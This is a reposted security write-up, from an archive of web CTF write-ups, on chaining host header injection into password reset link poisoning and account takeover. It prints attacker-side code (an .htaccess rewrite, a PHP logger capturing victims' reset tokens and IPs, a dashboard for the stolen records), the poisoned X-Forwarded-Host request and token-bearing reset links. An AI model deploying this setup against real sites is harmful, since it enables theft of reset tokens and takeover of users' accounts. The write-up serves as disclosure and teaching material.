# :globe_with_meridians: How I Chained Host Header Injection To Password Reset Link Poisoning To Xss And 

> **Original Source:** [How I Chained Host Header Injection To Password Reset Link Poisoning To Xss And ](https://infosecwriteups.com/how-i-chained-host-header-injection-to-password-reset-link-poisoning-to-xss-and-account-takeover-c5acad3acbb7)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

How I chained Host header Injection to Password Reset Link Poisoning to XSS and Account Takeover.

*Attacker Setup Matters*


Hello Cyber Security world, I trust you all are doing well from your side of the screen .


In this article I take you through how I was able to elevate from host header injection to XSS and finally Account Takeover. Our target is private so I use *redacted.com* in-place of the target throughout the article.


I am using simple snippets of : php ,html,css,javascript


EXPLOIT LAB SETUP:


- First , we we setup our attacker domain at: [https://requests.astralecorp.com/](https://requests.astralecorp.com/)


Now I create a `.htaccess` file to route the requests on the server:


The `.htaccess` file code is:


```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ log.php [L]
```


This `.htaccess` code redirects all requests for non-existent files and directories to `log.php` setting up a front controller pattern.


2. We create the `log.php `referenced by the `.htaccess`


The code for the `log.php `is:


```
<?php
$logFile = 'requests.txt';

$method = $_SERVER['REQUEST_METHOD'];
$uri = $_SERVER['REQUEST_URI'];
$queryString = $_SERVER['QUERY_STRING'];
$loggedParams = $uri . '?' . $queryString;
$ip = $_SERVER['REMOTE_ADDR'];

// Log the request to the file
file_put_contents($logFile, "$method $loggedParams [IP: $ip]\n", FILE_APPEND);

// Alert the logged parameters
echo "<script>alert('ATTACKER SUCCESSFULLY LOGGED YOUR IP AND: " . htmlspecialchars($loggedParams, ENT_QUOTES) . "');</script>";
?>
```


Now this code logs the HTTP request method, requested URI with query parameters, and the client’s IP address to a file, and displays an alert in the browser indicating that an attacker has successfully logged the IP and the requested parameters.


3. We now create ATTACKER DASHBOARD to log all requests and steal tokens as well as handle XSS rendering.


The code for a simple dashboard is:


```
<!DOCTYPE html>
<html>
<head>
<title>Admin Panel</title>
<style>
body {
background-color: #000;
color: #0f0;
font-family: 'Courier New', monospace;
padding: 20px;
}

pre {
background-color: #000;
padding: 10px;
overflow: auto;
white-space: pre-wrap;
border-radius: 5px;
max-height: 400px;
border: 1px solid #0f0;
}

.header {
font-size: 24px;
margin-bottom: 20px;
}

.button {
background-color: #0f0;
color: #000;
border: none;
padding: 8px 16px;
text-align: center;
text-decoration: none;
display: inline-block;
font-size: 16px;
margin-right: 10px;
cursor: pointer;
}
</style>
</head>
<body>
<h1 class="header">Request Logs</h1>
<pre id="console"></pre>
<div>
<button class="button" onclick="refreshLogs()">Refresh</button>
<button class="button" onclick="clearLogs()">Clear Logs</button>
<a href="#" class="button" onclick="exportLogs()">Export</a>
</div>
<script>
// Function to fetch and display the log file contents
function fetchLogs() {
fetch('requests.txt')
.then(response => response.text())
.then(data => {
const consoleElement = document.getElementById('console');
consoleElement.textContent = escapeHtml(data);
consoleElement.scrollTop = consoleElement.scrollHeight;
})
.catch(error => console.log(error));
}

// Escape HTML entities
function escapeHtml(text) {
const element = document.createElement('div');
element.textContent = text;
return element.innerHTML;
}

// Refresh logs button click handler
function refreshLogs() {
fetchLogs();
}

// Clear logs button click handler
function clearLogs() {
fetch('clear_logs.php', { method: 'POST' })
.then(response => {
if (response.ok) {
console.log('Logs cleared successfully');
fetchLogs();
}
})
.catch(error => console.log(error));
}

// Export logs button click handler
function exportLogs() {
const link = document.createElement('a');
link.href = 'requests.txt';
link.download = 'requests.txt';
link.click();
}

// Initial fetch of the log file contents
fetchLogs();
</script>
</body>
</html>
```


That just shows you a panel to load, refresh and delete stolen credential records.


## Get Thee Eclipse’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Now I created a `clear_logs.php `file referenced above for the Clear Logs button. Its code is:


```
<?php
$logFile = 'requests.txt';

// Clear the log file by truncating it
file_put_contents($logFile, '');

// Return a response indicating success
http_response_code(200);
echo 'Logs cleared successfully';
?>
```


NOW WE EXPLOIT!!


- Our target redacted.com has a password reset functionality with a request like:


```
POST /forgot-pass HTTP/1.1

Host: 127.0.0.1(target ip here)

Connection: close

Content-Length: 82

Cache-Control: max-age=0

sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"

sec-ch-ua-mobile: ?0

sec-ch-ua-platform: "Linux"

Upgrade-Insecure-Requests: 1

Origin: https://target ip here

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8

Sec-GPC: 1

Accept-Language: en-US,en

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: https://targetip here/forgot-password

Accept-Encoding: gzip, deflate

Cookie: XSRF-TOKEN=eelNoVvLyMyZmID; _session=FbHVlIWnpCSZDQzNTJiD


_token=mdV50TqjHnD&email=thee.eclipse1@gmail.com
```


2. Now I injected the:


```
X-Forwarded-Host: requests.astralecorp.com
```


The new HTTP request was:


```
Host: 127.0.0.1(target ip here)
X-Forwarded-Host: requests.astralecorp.com
REST OF THEREQUEST HERE AS BEFORE
```


3. Now with intercept on, I sent the request and got a 200OK status but what happened to the sent reset link?


I checked email and the reset link was like:

>

[https://requests.astralecorp.com/reset-pass/f3405fe011153660221f95cb8169a9e01290c1926a8595a51?email=thee.eclipse1%40gmail.com](https://requests.astralecorp.com/reset-password/f3405fe011153660e93c7220fa1b2db221f95cb8169a9e01290c1926a8595a51?email=th.ee.ecli.ps.e1%40gmail.com)


OUR ATTACK WORKED!! WE HAVE ATTACKER DOMAIN ON THE SENT EMAIL!!


But that is not all. Remember we setup out attack lab at: [https://requests.astralecorp.com](https://requests.astralecorp.com/reset-password/f3405fe011153660e93c7220fa1b2db221f95cb8169a9e01290c1926a8595a51?email=th.ee.ecli.ps.e1%40gmail.com) ?


4. Now clicking on the link I got an XSS!!!


*XSS setup on the attacker injected domain*


5. You can see the XSS tells us / the victim that : *ATTACKER SUCCESSFULLY LOGGED YOUR IP AND: /reset-password/f3405fe011153660e93c72db221f95cb8169a9e01290c1926a8595a51?email=th.ee.ecli.ps.e1%40gmail.com?email=thee.eclipse1%40gmail.com*


But what did the attacker see?


Let us go to our initially setup admin panel: [https://requests.astralecorp.com/admin.html#](https://requests.astralecorp.com/admin.html#)


We see the logs!!!


*Attacker dashboard*


6. Now we have targets IP and their password reset token!!

>

We change the reset link from our : [https://requests.astralecorp.com/reset-pass/f3405fe011153660221f95cb8169a9e01290c1926a8595a51?email=thee.eclipse1%40gmail.com](https://requests.astralecorp.com/reset-password/f3405fe011153660e93c7220fa1b2db221f95cb8169a9e01290c1926a8595a51?email=th.ee.ecli.ps.e1%40gmail.com) TO [https://redacted.com/reset-pass/f3405fe011153660221f95cb8169a9e01290c1926a8595a51?email=thee.eclipse1%40gmail.com](https://requests.astralecorp.com/reset-password/f3405fe011153660e93c7220fa1b2db221f95cb8169a9e01290c1926a8595a51?email=th.ee.ecli.ps.e1%40gmail.com) and we reset their password!!


### Account Takeover Achieved


That is how I was able to chain Host Header injection to XSS and Password Reset Link Poisoning to Account Takeover

>

Do not exploit my setup sever, that is just for demo and I decided not to obfuscate it


>

Thank you.


Follow up twitter.

---

*Originally published on [Medium](https://infosecwriteups.com/how-i-chained-host-header-injection-to-password-reset-link-poisoning-to-xss-and-account-takeover-c5acad3acbb7). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
